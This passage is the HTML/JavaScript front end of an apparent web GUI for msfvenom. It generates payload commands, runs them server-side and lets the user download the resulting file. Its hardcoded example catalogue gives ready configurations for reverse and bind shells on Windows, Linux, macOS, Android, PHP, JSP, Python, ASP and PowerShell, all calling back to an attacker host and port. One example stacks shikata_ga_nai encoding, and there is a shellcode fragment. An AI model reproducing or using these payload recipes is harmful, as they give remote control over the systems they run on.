            <div class="modal-header">
                <h2 id="installConfirmModalTitle">Confirm Installation</h2>
                <span class="modal-close" onclick="closeInstallConfirmModal()">&times;</span>
            </div>
            <div class="modal-body" id="installConfirmModalBody"></div>
            <div class="modal-footer flex justify-end space-x-4">
                <button onclick="closeInstallConfirmModal()" class="btn-secondary">Cancel</button>
                <button id="confirmInstallButton" class="btn-success">Install Now</button>
            </div>
        </div>
    </div>

    <!-- Example Output Modal -->
    <div id="exampleOutputModal" class="modal">
        <div class="modal-content">
            <div class="modal-header">
                <h2 id="exampleOutputModalTitle">Example Output</h2>
                <span class="modal-close" onclick="closeExampleOutputModal()">&times;</span>
            </div>
            <div class="modal-body">
                <pre id="exampleOutputModalText" class="w-full h-auto p-2 rounded bg-gray-900 text-gray-200 font-mono text-sm overflow-auto custom-scrollbar"></pre>
            </div>
            <div class="modal-footer">
                <button onclick="closeExampleOutputModal()" class="btn-primary">Close</button>
            </div>
        </div>
    </div>

    <script>
        // Initialize Lucide icons
        lucide.createIcons();

        // Global variables
        let allExamples = [];
        let currentScanId = null;
        let pollInterval = null;
        let searchStartIndex = 0; // For incremental search in output
        let currentOutputBuffer = ""; // Buffer to accumulate real-time output
        let generatedPayloadFilePath = null; // To store the path of the generated payload for download

        // Function to show/hide tabs
        function showTab(tabId) {
            document.querySelectorAll('.tab-content').forEach(tab => {
                tab.classList.remove('active');
            });
            document.querySelectorAll('.tab-button').forEach(button => {
                button.classList.remove('active');
            });
            document.querySelector(`.tab-button[data-tab="${tabId}"]`).classList.add('active');
            document.getElementById(tabId).classList.add('active');
            generateCommand(); // Regenerate command on tab change
        }

        // Event listeners for tab buttons
        document.querySelectorAll('.tab-button').forEach(button => {
            button.addEventListener('click', () => {
                showTab(button.dataset.tab);
            });
        });

        // --- Helper for showing custom modals ---
        function showMessageModal(title, message, isHtml = false) {
            document.getElementById('messageModalTitle').innerText = title;
            const messageBody = document.getElementById('messageModalBody');
            if (isHtml) {
                messageBody.innerHTML = message;
            } else {
                messageBody.innerText = message;
            }
            document.getElementById('messageModal').style.display = 'flex';
        }

        function closeMessageModal() {
            document.getElementById('messageModal').style.display = 'none';
        }

        function showInstallConfirmModal(title, message, onConfirm) {
            document.getElementById('installConfirmModalTitle').innerText = title;
            document.getElementById('installConfirmModalBody').innerHTML = message;
            const confirmButton = document.getElementById('confirmInstallButton');
            confirmButton.onclick = () => {
                closeInstallConfirmModal();
                onConfirm();
            };
            document.getElementById('installConfirmModal').style.display = 'flex';
        }

        function closeInstallConfirmModal() {
            document.getElementById('installConfirmModal').style.display = 'none';
        }

        function showExampleOutputModal(title, output) {
            document.getElementById('exampleOutputModalTitle').innerText = title;
            const outputPre = document.getElementById('exampleOutputModalText');
            outputPre.innerHTML = ''; // Clear previous content

            // Apply coloring based on msfvenom-like output
            insertColoredText(outputPre, output);
            document.getElementById('exampleOutputModal').style.display = 'flex';
        }

        function closeExampleOutputModal() {
            document.getElementById('exampleOutputModal').style.display = 'none';
        }

        // Function to collect form data
        function getFormData() {
            const formData = {};
            document.querySelectorAll('#tab-content-container input, #tab-content-container select, #tab-content-container textarea').forEach(element => {
                if (element.type === 'checkbox') {
                    formData[element.id] = element.checked;
                } else if (element.type === 'number') {
                    formData[element.id] = element.value ? parseFloat(element.value) : '';
                }
                else {
                    formData[element.id] = element.value;
                }
            });
            return formData;
        }

        // Function to generate msfvenom command
        async function generateCommand() {
            const formData = getFormData();
            try {
                const response = await fetch('/generate_command', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify(formData),
                });
                const data = await response.json();
                document.getElementById('command_text').value = data.command;
            } catch (error) {
                console.error('Error generating command:', error);
                document.getElementById('command_text').value = 'Error generating command.';
            }
        }

        // Function to copy command to clipboard
        function copyCommand() {
            const commandText = document.getElementById('command_text');
            commandText.select();
            document.execCommand('copy');
            showMessageModal('Command Copied', 'The command has been copied to your clipboard!');
        }

        // Function to run msfvenom
        async function runMsfvenom() {
            if (currentScanId) {
                showMessageModal('MSFvenom Running', 'MSFvenom is already running. Please wait for it to finish.');
                return;
            }

            const command = document.getElementById('command_text').value;
            const outputFileName = document.getElementById('output_file_entry').value; // Get the desired output filename
            
            if (!command) {
                showMessageModal('Error', 'No command to run.');
                return;
            }

            // Disable generate and download buttons, clear output
            document.getElementById('run_msfvenom_button').disabled = true;
            document.getElementById('download_payload_button').disabled = true;
            document.getElementById('output_text').innerHTML = '';
            currentOutputBuffer = "";
            generatedPayloadFilePath = null;
            clearSearchHighlight();
            showStatus('Starting MSFvenom...', 'blue');

            try {
                const response = await fetch('/run_msfvenom', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify({ command: command, output_file: outputFileName }),
                });
                const data = await response.json();
                if (data.status === 'error') {
                    showMessageModal('Error', data.message);
                    showStatus(`Error: ${data.message}`, 'red');
                    document.getElementById('run_msfvenom_button').disabled = false;
                } else {
                    currentScanId = data.scan_id;
                    generatedPayloadFilePath = data.output_file_path; // Store the returned file path
                    showStatus(`MSFvenom process started (ID: ${currentScanId}). Fetching output...`, 'blue');
                    // Start polling for output
                    pollInterval = setInterval(pollOutput, 500); // Poll every 500ms
                }
            } catch (error) {
                console.error('Error starting msfvenom:', error);
                showMessageModal('Error', 'An error occurred while starting msfvenom.');
                showStatus('An error occurred while starting msfvenom.', 'red');
                document.getElementById('run_msfvenom_button').disabled = false;
            }
        }

        // Polling for msfvenom output
        async function pollOutput() {
            if (!currentScanId) {
                clearInterval(pollInterval);
                pollInterval = null;
                return;
            }

            try {
                const response = await fetch(`/get_process_output/${currentScanId}`);
                const data = await response.json();
                const outputTextElement = document.getElementById('output_text');
                
                if (data.output) {
                    // Only append new output to the buffer
                    const newOutputSegment = data.output.substring(currentOutputBuffer.length);
                    currentOutputBuffer += newOutputSegment;
                    insertColoredText(outputTextElement, currentOutputBuffer);
                }

                if (data.status === 'running') {
                    showStatus('MSFvenom is running...', 'blue');
                } else if (data.status === 'completed' || data.status === 'success' || data.status === 'error') {
                    clearInterval(pollInterval);
                    pollInterval = null;
                    currentScanId = null;
                    currentOutputBuffer = data.output; // Get final complete output
                    insertColoredText(outputTextElement, currentOutputBuffer);
                    if (data.status === 'completed' || data.status === 'success') {
                        showStatus('MSFvenom process completed successfully.', 'green');
                        if (data.file_path) {
                            generatedPayloadFilePath = data.file_path; // Update with final path if available
                            document.getElementById('download_payload_button').disabled = false;
                        }
                    } else {
                        showStatus(`Process failed: ${data.message || 'Unknown error'}`, 'red');
                        showMessageModal('Process Error', data.message || 'An unknown error occurred during the process.');
                    }
                    document.getElementById('run_msfvenom_button').disabled = false;
                    // Re-enable install buttons if they were disabled for installation
                    document.getElementById('install_msfvenom_linux_button').disabled = false;
                    document.getElementById('install_msfvenom_termux_button').disabled = false;
                    document.getElementById('download_msfvenom_windows_button').disabled = false;
                } else if (data.status === 'not_found') {
                    clearInterval(pollInterval);
                    pollInterval = null;
                    currentScanId = null;
                    showStatus(`Process failed: ${data.message || 'Process ID not found or expired.'}`, 'red');
                    showMessageModal('Process Error', data.message || 'Process ID not found or expired.');
                    document.getElementById('run_msfvenom_button').disabled = false;
                    // Re-enable install buttons if they were disabled for installation
                    document.getElementById('install_msfvenom_linux_button').disabled = false;
                    document.getElementById('install_msfvenom_termux_button').disabled = false;
                    document.getElementById('download_msfvenom_windows_button').disabled = false;
                }
            } catch (error) {
                console.error('Error polling output:', error);
                showMessageModal('Polling Error', 'An error occurred while fetching output.');
                showStatus('An error occurred while fetching output.', 'red');
                clearInterval(pollInterval);
                pollInterval = null;
                currentScanId = null;
                document.getElementById('run_msfvenom_button').disabled = false;
                // Re-enable install buttons if they were disabled for installation
                document.getElementById('install_msfvenom_linux_button').disabled = false;
                document.getElementById('install_msfvenom_termux_button').disabled = false;
                document.getElementById('download_msfvenom_windows_button').disabled = false;
            }
        }

        // Helper to insert colored text based on msfvenom output patterns
        function insertColoredText(element, text) {
            element.innerHTML = ''; // Clear current content to re-insert with spans
            const lines = text.split('\n');
            const fragment = document.createDocumentFragment();

            lines.forEach(line => {
                const span = document.createElement('span');
                let className = 'output-default';

                if (line.toLowerCase().includes('successfully generated') || line.toLowerCase().includes('payload size')) {
                    className = 'output-green';
                } else if (line.toLowerCase().includes('error') || line.toLowerCase().includes('failed')) {
                    className = 'output-red';
                } else if (line.toLowerCase().includes('msfvenom') || line.toLowerCase().includes('starting') || line.toLowerCase().includes('completed') || line.toLowerCase().includes('executing command') || line.toLowerCase().includes('detected')) {
                    className = 'output-blue';
                } else if (line.toLowerCase().includes('warning')) {
                    className = 'output-orange';
                }
                
                span.className = className;
                span.textContent = line + '\n'; // Add newline back for pre tag
                fragment.appendChild(span);
            });
            element.appendChild(fragment);
            element.scrollTop = element.scrollHeight; // Scroll to bottom
        }

        // Function to clear output
        function clearOutput() {
            document.getElementById('output_text').innerHTML = '';
            currentOutputBuffer = "";
            showStatus('Ready');
            clearSearchHighlight();
            document.getElementById('download_payload_button').disabled = true;
            generatedPayloadFilePath = null;
            if (currentScanId) {
                clearInterval(pollInterval);
                pollInterval = null;
                currentScanId = null;
            }
        }

        // Function to download generated payload
        function downloadPayload() {
            if (generatedPayloadFilePath) {
                // Extract just the filename from the full path
                const filename = generatedPayloadFilePath.split('/').pop().split('\\').pop();
                const downloadUrl = `/download_payload/${filename}`;
                const downloadLink = document.createElement('a');
                downloadLink.href = downloadUrl;
                downloadLink.download = filename; // Suggest filename for download
                downloadLink.style.display = 'none';
                document.body.appendChild(downloadLink);
                downloadLink.click();
                document.body.removeChild(downloadLink);
                showMessageModal('Download', `Payload '${filename}' should be downloading.`);
            } else {
                showMessageModal('Download Error', 'No payload has been generated yet or the file path is unknown.');
            }
        }

        // Attach downloadPayload to the button
        document.getElementById('download_payload_button').addEventListener('click', downloadPayload);


        // Function to update status bar
        function showStatus(message, color = 'white') {
            const statusBar = document.getElementById('status_bar');
            statusBar.textContent = message;
            statusBar.style.color = color;
        }

        // Function to search output
        function searchOutput() {
            const searchTerm = document.getElementById('search_entry').value.trim().toLowerCase();
            const outputTextElement = document.getElementById('output_text');
            const fullText = outputTextElement.textContent; // Use textContent to get plain text

            clearSearchHighlight(); // Clear existing highlights first

            if (!searchTerm) {
                searchStartIndex = 0;
                return;
            }

            let found = false;
            let newContent = '';
            let lastIndex = 0;

            const regex = new RegExp(searchTerm, 'gi'); // 'gi' for global and case-insensitive

            let match;
            while ((match = regex.exec(fullText)) !== null) {
                found = true;
                const index = match.index;
                const matchedText = match[0];

                // Append content before the match
                newContent += escapeHtml(fullText.substring(lastIndex, index));
                // Append the highlighted match
                newContent += `<mark class="highlight">${escapeHtml(matchedText)}</mark>`;
                lastIndex = index + matchedText.length;
            }
            newContent += escapeHtml(fullText.substring(lastIndex)); // Append remaining content

            outputTextElement.innerHTML = newContent;

            if (!found) {
                showMessageModal('Search', `No occurrences of '${searchTerm}' found.`);
            } else {
                // Scroll to the first highlighted element
                const firstHighlight = outputTextElement.querySelector('mark.highlight');
                if (firstHighlight) {
                    firstHighlight.scrollIntoView({ behavior: 'smooth', block: 'center' });
                }
            }
        }

        // Function to clear search highlight
        function clearSearchHighlight() {
            const outputTextElement = document.getElementById('output_text');
            const currentContent = outputTextElement.textContent; // Get plain text content
            outputTextElement.innerHTML = ''; // Clear existing content
            insertColoredText(outputTextElement, currentContent); // Re-insert without highlights
            searchStartIndex = 0;
        }

        // Function to show help popup
        function showHelp(helpText) {
            const overlay = document.createElement('div');
            overlay.className = 'help-popup-overlay';
            overlay.onclick = () => {
                document.body.removeChild(overlay);
                document.body.removeChild(popup);
            };
            document.body.appendChild(overlay);

            const popup = document.createElement('div');
            popup.className = 'help-popup';
            popup.innerHTML = `
                <h3 class="text-xl font-bold text-purple-300 mb-4">Help</h3>
                <div class="flex-grow overflow-y-auto custom-scrollbar p-2 bg-gray-600 rounded text-gray-200 text-sm mb-4">
                    ${helpText.replace(/\n/g, '<br>')}
                </div>
                <button class="bg-purple-500 hover:bg-purple-600 text-white px-4 py-2 rounded-md self-center" onclick="this.parentNode.parentNode.removeChild(this.parentNode); document.body.removeChild(document.querySelector('.help-popup-overlay'));">Close</button>
            `;
            document.body.appendChild(popup);
        }

        // --- Examples Tab Functions ---
        async function loadExamples() {
            try {
                // Fetch examples from the backend (assuming /get_examples endpoint)
                const response = await fetch('/get_examples');
                if (response.ok) {
                    allExamples = await response.json();
                } else {
                    console.warn("Could not fetch examples from backend, using hardcoded examples.");
                    // Fallback to hardcoded examples if backend fails
                    allExamples = [
                        {
                            "name": "Windows Meterpreter Reverse TCP (EXE)",
                            "description": "Generates a Windows Meterpreter reverse TCP payload in an executable format. Requires LHOST and LPORT.",
                            "options": {
                                "payload_entry": "windows/meterpreter/reverse_tcp",
                                "lhost_entry": "192.168.1.100",
                                "lport_entry": "4444",
                                "format_entry": "exe",
                                "output_file_entry": "shell.exe"
                            },
                            "example_output": "No LHOST or LPORT given, defaulting to ...\nNo platform was selected, choosing Msf::Module::Platform::Windows from the payload\nNo arch selected, selecting arch: x86 from the payload\nNo encoder or badchars specified, outputting raw payload\nPayload size: 341 bytes\nFinal size of exe file: 73802 bytes\n"
                        },
                        {
                            "name": "Linux Meterpreter Reverse TCP (ELF)",
                            "description": "Generates a Linux Meterpreter reverse TCP payload in an ELF executable format. Requires LHOST and LPORT.",
                            "options": {
                                "payload_entry": "linux/x86/meterpreter/reverse_tcp",
                                "lhost_entry": "192.168.1.100",
                                "lport_entry": "4444",
                                "format_entry": "elf",
                                "output_file_entry": "shell.elf"
                            },
                            "example_output": "No LHOST or LPORT given, defaulting to ...\nNo platform was selected, choosing Msf::Module::Platform::Linux from the payload\nNo arch selected, selecting arch: x86 from the payload\nNo encoder or badchars specified, outputting raw payload\nPayload size: 107 bytes\nFinal size of elf file: 164 bytes\n"
                        },
                        {
                            "name": "PHP Reverse Shell",
                            "description": "Generates a simple PHP reverse shell script. Requires LHOST and LPORT.",
                            "options": {
                                "payload_entry": "php/reverse_php",
                                "lhost_entry": "192.168.1.100",
                                "lport_entry": "4444",
                                "format_entry": "raw",
                                "output_file_entry": "shell.php"
                            },
                            "example_output": "No LHOST or LPORT given, defaulting to ...\nNo platform was selected, choosing Msf::Module::Platform::PHP from the payload\nNo arch selected, selecting arch: php from the payload\nNo encoder or badchars specified, outputting raw payload\nPayload size: 1234 bytes\n<?php /* php/reverse_php */\n// PHP reverse shell code here\n?>"
                        },
                        {
                            "name": "ASP Meterpreter Reverse TCP",
                            "description": "Generates an ASP Meterpreter reverse TCP payload. Requires LHOST and LPORT.",
                            "options": {
                                "payload_entry": "windows/meterpreter/reverse_tcp",
                                "lhost_entry": "192.168.1.100",
                                "lport_entry": "4444",
                                "format_entry": "asp",
                                "output_file_entry": "shell.asp"
                            },
                            "example_output": "No LHOST or LPORT given, defaulting to ...\nNo platform was selected, choosing Msf::Module::Platform::Windows from the payload\nNo arch selected, selecting arch: x86 from the payload\nNo encoder or badchars specified, outputting raw payload\nPayload size: 341 bytes\n"
                        },
                        {
                            "name": "JSP Reverse Shell",
                            "description": "Generates a JSP reverse shell payload. Requires LHOST and LPORT.",
                            "options": {
                                "payload_entry": "java/jsp_shell_reverse_tcp",
                                "lhost_entry": "192.168.1.100",
                                "lport_entry": "4444",
                                "format_entry": "raw",
                                "output_file_entry": "shell.jsp"
                            },
                            "example_output": "No LHOST or LPORT given, defaulting to ...\nNo platform was selected, choosing Msf::Module::Platform::Java from the payload\nNo arch selected, selecting arch: java from the payload\nNo encoder or badchars specified, outputting raw payload\nPayload size: 2100 bytes\n"
                        },
                        {
                            "name": "Python Reverse Shell",
                            "description": "Generates a Python reverse shell script. Requires LHOST and LPORT.",
                            "options": {
                                "payload_entry": "python/shell_reverse_tcp",
                                "lhost_entry": "192.168.1.100",
                                "lport_entry": "4444",
                                "format_entry": "raw",
                                "output_file_entry": "shell.py"
                            },
                            "example_output": "No LHOST or LPORT given, defaulting to ...\nNo platform was selected, choosing Msf::Module::Platform::Python from the payload\nNo arch selected, selecting arch: python from the payload\nNo encoder or badchars specified, outputting raw payload\nPayload size: 300 bytes\n"
                        },
                        {
                            "name": "Windows x64 Meterpreter Reverse TCP (EXE)",
                            "description": "Generates a 64-bit Windows Meterpreter reverse TCP payload. Requires LHOST and LPORT.",
                            "options": {
                                "payload_entry": "windows/x64/meterpreter/reverse_tcp",
                                "lhost_entry": "192.168.1.100",
                                "lport_entry": "4444",
                                "format_entry": "exe",
                                "output_file_entry": "shell_x64.exe"
                            },
                            "example_output": "No LHOST or LPORT given, defaulting to ...\nNo platform was selected, choosing Msf::Module::Platform::Windows from the payload\nNo arch selected, selecting arch: x64 from the payload\nNo encoder or badchars specified, outputting raw payload\nPayload size: 400 bytes\nFinal size of exe file: 75000 bytes\n"
                        },
                        {
                            "name": "Windows Meterpreter Reverse HTTP (EXE)",
                            "description": "Generates a Windows Meterpreter reverse HTTP payload. Requires LHOST and LPORT.",
                            "options": {
                                "payload_entry": "windows/meterpreter/reverse_http",
                                "lhost_entry": "192.168.1.100",
                                "lport_entry": "8080",
                                "format_entry": "exe",
                                "output_file_entry": "http_shell.exe"
                            },
                            "example_output": "No LHOST or LPORT given, defaulting to ...\nNo platform was selected, choosing Msf::Module::Platform::Windows from the payload\nNo arch selected, selecting arch: x86 from the payload\nNo encoder or badchars specified, outputting raw payload\nPayload size: 500 bytes\nFinal size of exe file: 74000 bytes\n"
                        },
                        {
                            "name": "Windows Meterpreter Reverse HTTPS (EXE)",
                            "description": "Generates a Windows Meterpreter reverse HTTPS payload. Requires LHOST and LPORT.",
                            "options": {
                                "payload_entry": "windows/meterpreter/reverse_https",
                                "lhost_entry": "192.168.1.100",
                                "lport_entry": "443",
                                "format_entry": "exe",
                                "output_file_entry": "https_shell.exe"
                            },
                            "example_output": "No LHOST or LPORT given, defaulting to ...\nNo platform was selected, choosing Msf::Module::Platform::Windows from the payload\nNo arch selected, selecting arch: x86 from the payload\nNo encoder or badchars specified, outputting raw payload\nPayload size: 600 bytes\nFinal size of exe file: 74500 bytes\n"
                        },
                        {
                            "name": "Windows Shell Bind TCP (EXE)",
                            "description": "Generates a Windows shell bind TCP payload. Requires RPORT.",
                            "options": {
                                "payload_entry": "windows/shell/bind_tcp",
                                "rport_entry": "4444",
                                "format_entry": "exe",
                                "output_file_entry": "bind_shell.exe"
                            },
                            "example_output": "No RPORT given, defaulting to ...\nNo platform was selected, choosing Msf::Module::Platform::Windows from the payload\nNo arch selected, selecting arch: x86 from the payload\nNo encoder or badchars specified, outputting raw payload\nPayload size: 200 bytes\nFinal size of exe file: 73000 bytes\n"
                        },
                        {
                            "name": "Windows Meterpreter Reverse TCP (Shikata Ga Nai Encoded)",
                            "description": "Generates an encoded Windows Meterpreter reverse TCP payload using shikata_ga_nai encoder with 5 iterations. Requires LHOST and LPORT.",
                            "options": {
                                "payload_entry": "windows/meterpreter/reverse_tcp",
                                "lhost_entry": "192.168.1.100",
                                "lport_entry": "4444",
                                "encoder_entry": "x86/shikata_ga_nai",
                                "iterations_entry": "5",
                                "format_entry": "exe",
                                "output_file_entry": "encoded_shell.exe"
                            },
                            "example_output": "No LHOST or LPORT given, defaulting to ...\nNo platform was selected, choosing Msf::Module::Platform::Windows from the payload\nNo arch selected, selecting arch: x86 from the payload\nFound 1 compatible encoders\nAttempting to encode payload with x86/shikata_ga_nai\nx86/shikata_ga_nai succeeded with size 341 (iteration 1)\nx86/shikata_ga_nai succeeded with size 360 (iteration 2)\nx86/shikata_ga_nai succeeded with size 380 (iteration 3)\nx86/shikata_ga_nai succeeded with size 400 (iteration 4)\nx86/shikata_ga_nai succeeded with size 420 (iteration 5)\nPayload size: 420 bytes\nFinal size of exe file: 74000 bytes\n"
                        },
                        {
                            "name": "Windows Meterpreter Reverse TCP (Bad Characters)",
                            "description": "Generates a Windows Meterpreter reverse TCP payload avoiding specified bad characters (e.g., null byte and newline). Requires LHOST and LPORT.",
                            "options": {
                                "payload_entry": "windows/meterpreter/reverse_tcp",
                                "lhost_entry": "192.168.1.100",
                                "lport_entry": "4444",
                                "bad_chars_entry": "\\x00\\x0a\\x0d",
                                "format_entry": "exe",
                                "output_file_entry": "no_badchars_shell.exe"
                            },
                            "example_output": "No LHOST or LPORT given, defaulting to ...\nNo platform was selected, choosing Msf::Module::Platform::Windows from the payload\nNo arch selected, selecting arch: x86 from the payload\nFound 1 compatible encoders\nAttempting to encode payload with x86/shikata_ga_nai\nx86/shikata_ga_nai succeeded with size 341 (iteration 1)\nPayload size: 341 bytes\nFinal size of exe file: 73802 bytes\n"
                        },
                        {
                            "name": "Windows Meterpreter Reverse TCP (RAW)",
                            "description": "Generates raw shellcode for Windows Meterpreter reverse TCP. Requires LHOST and LPORT.",
                            "options": {
                                "payload_entry": "windows/meterpreter/reverse_tcp",
                                "lhost_entry": "192.168.1.100",
                                "lport_entry": "4444",
                                "format_entry": "raw",
                                "output_file_entry": "shellcode.bin"
                            },
                            "example_output": "No LHOST or LPORT given, defaulting to ...\nNo platform was selected, choosing Msf::Module::Platform::Windows from the payload\nNo arch selected, selecting arch: x86 from the payload\nNo encoder or badchars specified, outputting raw payload\nPayload size: 341 bytes\n"
                        },
                        {
                            "name": "Windows Meterpreter Reverse TCP (C)",
                            "description": "Generates C-style shellcode for Windows Meterpreter reverse TCP. Requires LHOST and LPORT.",
                            "options": {
                                "payload_entry": "windows/meterpreter/reverse_tcp",
                                "lhost_entry": "192.168.1.100",
                                "lport_entry": "4444",
                                "format_entry": "c",
                                "output_file_entry": "shellcode.c"
                            },
                            "example_output": "No LHOST or LPORT given, defaulting to ...\nNo platform was selected, choosing Msf::Module::Platform::Windows from the payload\nNo arch selected, selecting arch: x86 from the payload\nNo encoder or badchars specified, outputting raw payload\nPayload size: 341 bytes\nunsigned char buf[] =\n\"\\xfc\\xe8\\x82\\x00\\x00\\x00\\x60\\x89\\xe5\\x31\\xc0\\x64\\x8b\\x50\\x30\"\n..."
                        },
                        {
                            "name": "List Payloads",
                            "description": "Lists all available payloads in msfvenom.",
                            "options": {
                                "list_payloads_var": true
                            },
                            "example_output": "Available payloads:\n-------------------\n\nwindows/meterpreter/reverse_tcp\nwindows/shell/reverse_tcp\nlinux/x86/meterpreter/reverse_tcp\n...\n"
                        },
                        {
                            "name": "List Encoders",
                            "description": "Lists all available encoders in msfvenom.",
                            "options": {
                                "list_encoders_var": true
                            },
                            "example_output": "Available encoders:\n-------------------\n\nx86/shikata_ga_nai\nx86/alpha_mixed\nx86/alpha_upper\n...\n"
                        },
                        {
                            "name": "List Formats",
                            "description": "Lists all available output formats in msfvenom.",
                            "options": {
                                "list_formats_var": true
                            },
                            "example_output": "Available formats:\n------------------\n\nraw\nexe\nelf\n...\n"
                        },
                        {
                            "name": "List Architectures",
                            "description": "Lists all available architectures in msfvenom.",
                            "options": {
                                "list_architectures_var": true
                            },
                            "example_output": "Available architectures:\n------------------------\n\nx86\nx64\narmle\n...\n"
                        },
                        {
                            "name": "List Platforms",
                            "description": "Lists all available platforms in msfvenom.",
                            "options": {
                                "list_platforms_var": true
                            },
                            "example_output": "Available platforms:\n--------------------\n\nwindows\nlinux\nosx\n...\n"
                        },
                        {
                            "name": "Android Meterpreter Reverse TCP (APK)",
                            "description": "Generates an Android Meterpreter reverse TCP payload in an APK format. Requires LHOST and LPORT.",
                            "options": {
                                "payload_entry": "android/meterpreter/reverse_tcp",
                                "lhost_entry": "192.168.1.100",
                                "lport_entry": "4444",
                                "format_entry": "apk",
                                "output_file_entry": "android_shell.apk"
                            },
                            "example_output": "No LHOST or LPORT given, defaulting to ...\nNo platform was selected, choosing Msf::Module::Platform::Android from the payload\nNo arch selected, selecting arch: dalvik from the payload\nNo encoder or badchars specified, outputting raw payload\nPayload size: 10000 bytes\nFinal size of apk file: 2000000 bytes\n"
                        },
                        {
                            "name": "macOS Meterpreter Reverse TCP (Mach-O)",
                            "description": "Generates a macOS Meterpreter reverse TCP payload in a Mach-O executable format. Requires LHOST and LPORT.",
                            "options": {
                                "payload_entry": "osx/x64/meterpreter/reverse_tcp",
                                "lhost_entry": "192.168.1.100",
                                "lport_entry": "4444",
                                "format_entry": "macho",
                                "output_file_entry": "macos_shell"
                            },
                            "example_output": "No LHOST or LPORT given, defaulting to ...\nNo platform was selected, choosing Msf::Module::Platform::OSX from the payload\nNo arch selected, selecting arch: x64 from the payload\nNo encoder or badchars specified, outputting raw payload\nPayload size: 500 bytes\nFinal size of macho file: 80000 bytes\n"
                        },
                        {
                            "name": "Windows Meterpreter Reverse TCP (PowerShell)",
                            "description": "Generates a PowerShell script for Windows Meterpreter reverse TCP. Requires LHOST and LPORT.",
                            "options": {
                                "payload_entry": "windows/meterpreter/reverse_tcp",
                                "lhost_entry": "192.168.1.100",
                                "lport_entry": "4444",
                                "format_entry": "psh",
                                "output_file_entry": "shell.ps1"
                            },
                            "example_output": "No LHOST or LPORT given, defaulting to ...\nNo platform was selected, choosing Msf::Module::Platform::Windows from the payload\nNo arch selected, selecting arch: x86 from the payload\nNo encoder or badchars specified, outputting raw payload\nPayload size: 341 bytes\nfunction Invoke-Shellcode\n{\n    [CmdletBinding()]\n    Param(\n        [Parameter(Mandatory=$True)]\n        [Byte[]]$Shellcode\n    )\n...\n"
                        }
                    ];
                }
                filterExamples(); // Display all examples initially
            } catch (error) {
                console.error('Error loading examples:', error);
                showStatus('Error loading examples. Using hardcoded examples.', 'red');
                // Ensure allExamples is populated even if fetch fails
                allExamples = [
                    {
                        "name": "Windows Meterpreter Reverse TCP (EXE)",
                        "description": "Generates a Windows Meterpreter reverse TCP payload in an executable format. Requires LHOST and LPORT.",
                        "options": {
                            "payload_entry": "windows/meterpreter/reverse_tcp",
                            "lhost_entry": "192.168.1.100",
                            "lport_entry": "4444",
                            "format_entry": "exe",
                            "output_file_entry": "shell.exe"
                        },
                        "example_output": "No LHOST or LPORT given, defaulting to ...\nNo platform was selected, choosing Msf::Module::Platform::Windows from the payload\nNo arch selected, selecting arch: x86 from the payload\nNo encoder or badchars specified, outputting raw payload\nPayload size: 341 bytes\nFinal size of exe file: 73802 bytes\n"
                    },
                    {
                        "name": "Linux Meterpreter Reverse TCP (ELF)",
                        "description": "Generates a Linux Meterpreter reverse TCP payload in an ELF executable format. Requires LHOST and LPORT.",
                        "options": {
                            "payload_entry": "linux/x86/meterpreter/reverse_tcp",
                            "lhost_entry": "192.168.1.100",
                            "lport_entry": "4444",
                            "format_entry": "elf",
                            "output_file_entry": "shell.elf"
                        },
                        "example_output": "No LHOST or LPORT given, defaulting to ...\nNo platform was selected, choosing Msf::Module::Platform::Linux from the payload\nNo arch selected, selecting arch: x86 from the payload\nNo encoder or badchars specified, outputting raw payload\nPayload size: 107 bytes\nFinal size of elf file: 164 bytes\n"
                    },
                    {
                        "name": "PHP Reverse Shell",
                        "description": "Generates a simple PHP reverse shell script. Requires LHOST and LPORT.",
                        "options": {
                            "payload_entry": "php/reverse_php",
                            "lhost_entry": "192.168.1.100",
                            "lport_entry": "4444",
                            "format_entry": "raw",
                            "output_file_entry": "shell.php"
                        },
                        "example_output": "No LHOST or LPORT given, defaulting to ...\nNo platform was selected, choosing Msf::Module::Platform::PHP from the payload\nNo arch selected, selecting arch: php from the payload\nNo encoder or badchars specified, outputting raw payload\nPayload size: 1234 bytes\n<?php /* php/reverse_php */\n// PHP reverse shell code here\n?>"
                    },
                    {
                        "name": "ASP Meterpreter Reverse TCP",
                        "description": "Generates an ASP Meterpreter reverse TCP payload. Requires LHOST and LPORT.",
                        "options": {
                            "payload_entry": "windows/meterpreter/reverse_tcp",
                            "lhost_entry": "192.168.1.100",
                            "lport_entry": "4444",
                            "format_entry": "asp",
                            "output_file_entry": "shell.asp"
                        },
                        "example_output": "No LHOST or LPORT given, defaulting to ...\nNo platform was selected, choosing Msf::Module::Platform::Windows from the payload\nNo arch selected, selecting arch: x86 from the payload\nNo encoder or badchars specified, outputting raw payload\nPayload size: 341 bytes\n"
                    },
                    {
                        "name": "JSP Reverse Shell",
                        "description": "Generates a JSP reverse shell payload. Requires LHOST and LPORT.",
                        "options": {
                            "payload_entry": "java/jsp_shell_reverse_tcp",
                            "lhost_entry": "192.168.1.100",
                            "lport_entry": "4444",
                            "format_entry": "raw",
                            "output_file_entry": "shell.jsp"
                        },
                        "example_output": "No LHOST or LPORT given, defaulting to ...\nNo platform was selected, choosing Msf::Module::Platform::Java from the payload\nNo arch selected, selecting arch: java from the payload\nNo encoder or badchars specified, outputting raw payload\nPayload size: 2100 bytes\n"
                    },
                    {
                        "name": "Python Reverse Shell",
                        "description": "Generates a Python reverse shell script. Requires LHOST and LPORT.",
                        "options": {
                            "payload_entry": "python/shell_reverse_tcp",
                            "lhost_entry": "192.168.1.100",
                            "lport_entry": "4444",
                            "format_entry": "raw",
                            "output_file_entry": "shell.py"
                        },
                        "example_output": "No LHOST or LPORT given, defaulting to ...\nNo platform was selected, choosing Msf::Module::Platform::Python from the payload\nNo arch selected, selecting arch: python from the payload\nNo encoder or badchars specified, outputting raw payload\nPayload size: 300 bytes\n"
                    },
                    {
                        "name": "Windows x64 Meterpreter Reverse TCP (EXE)",
                        "description": "Generates a 64-bit Windows Meterpreter reverse TCP payload. Requires LHOST and LPORT.",
                        "options": {
                            "payload_entry": "windows/x64/meterpreter/reverse_tcp",
                            "lhost_entry": "192.168.1.100",
                            "lport_entry": "4444",
                            "format_entry": "exe",
                            "output_file_entry": "shell_x64.exe"
                        },
